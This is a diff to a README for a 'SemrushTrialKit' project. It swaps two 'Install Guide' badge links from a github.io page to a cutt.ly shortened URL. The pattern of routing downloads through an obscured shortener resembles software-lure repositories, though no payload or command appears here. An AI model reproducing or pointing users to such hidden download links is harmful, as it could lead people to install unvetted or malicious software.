@@ -12,8 +12,8 @@
 
 ---
 
-<a href="https://semrushexplorecommunity.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install_Guide-Windows-3498db" alt="Install Guide Now" width="250" height="45" style="border:none;">
+<a href="https://cutt.ly/yrNtiq3S" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 ## 🚀 Getting Started
@@ -42,8 +42,8 @@ Start your Semrush trial with **SemrushTrialKit** on Windows or Mac/iOS:
 
 ---
 
-<a href="https://semrushexplorecommunity.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install_Guide-Windows-3498db" alt="Install Guide Now" width="250" height="45" style="border:none;">
+<a href="https://cutt.ly/yrNtiq3S" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 ## 🛠 Why SemrushTrialKit?
